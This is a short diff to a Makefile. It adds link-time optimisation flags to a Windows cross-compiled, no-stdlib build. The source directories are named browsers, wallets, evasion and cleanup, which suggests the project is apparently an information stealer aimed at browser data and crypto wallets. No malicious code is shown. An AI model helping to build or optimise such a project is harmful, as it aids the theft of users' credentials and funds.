@@ -1,7 +1,7 @@
 CC = x86_64-w64-mingw32-gcc
 NASM = nasm
-CFLAGS = -Wall -Wextra -Wno-error -O2 -fdata-sections -ffunction-sections -Iinclude -Isrc -Isrc/rt -Isrc/utils -Isrc/parsers -Isrc/browsers -Isrc/wallets -Isrc/system -Isrc/network -Isrc/crypto -Isrc/evasion -Isrc/cleanup
-LDFLAGS = -nostdlib -Wl,--gc-sections -Wl,-e,mainCRTStartup -Wl,--subsystem,windows
+CFLAGS = -Wall -Wextra -Wno-error -O2 -flto -fdata-sections -ffunction-sections -Iinclude -Isrc -Isrc/rt -Isrc/utils -Isrc/parsers -Isrc/browsers -Isrc/wallets -Isrc/system -Isrc/network -Isrc/crypto -Isrc/evasion -Isrc/cleanup
+LDFLAGS = -flto -nostdlib -Wl,--gc-sections -Wl,-e,mainCRTStartup -Wl,--subsystem,windows
 
 SRCS = src/main.c \
        src/rt/rt_startup.c \
